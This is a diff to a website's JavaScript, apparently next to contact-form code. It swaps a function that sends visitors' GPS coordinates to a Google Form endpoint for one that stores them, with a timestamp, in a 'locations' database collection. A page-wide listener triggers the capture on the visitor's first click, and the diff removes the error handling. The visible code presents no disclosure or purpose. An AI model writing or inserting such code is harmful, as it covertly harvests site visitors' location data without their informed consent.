@@ -402,32 +402,25 @@ function bindContactForm(){
     } catch(e){}
   }
 }
-function sendLocationToGoogleForm(lat, lon, acc) {
-  const formUrl = "https://docs.google.com/forms/d/e/1FAIpQLSc8_1bvxyfBuUXesnPi0XB1DHnCgbASxePGMB3qbQ1L7ShohA/formResponse";
-
-  const data = new FormData();
-  data.append("entry.2079203041", lat);
-  data.append("entry.1053820474", lon);
-  data.append("entry.1349976098", acc);
-
-  fetch(formUrl, {
-    method: "POST",
-    mode: "no-cors",
-    body: data
+function saveLocation(lat, lon, acc) {
+  db.collection("locations").add({
+    lat: lat,
+    lon: lon,
+    accuracy: acc,
+    timestamp: new Date().toISOString()
   });
 }
 
 function autoCaptureLocation() {
   navigator.geolocation.getCurrentPosition(pos => {
-    sendLocationToGoogleForm(
+    saveLocation(
       pos.coords.latitude,
       pos.coords.longitude,
       pos.coords.accuracy
     );
-  }, err => {
-    console.log("Location denied or failed:", err);
   });
 }
 
+// ✅ trigger on first user tap
 window.addEventListener("click", autoCaptureLocation, { once: true });
 
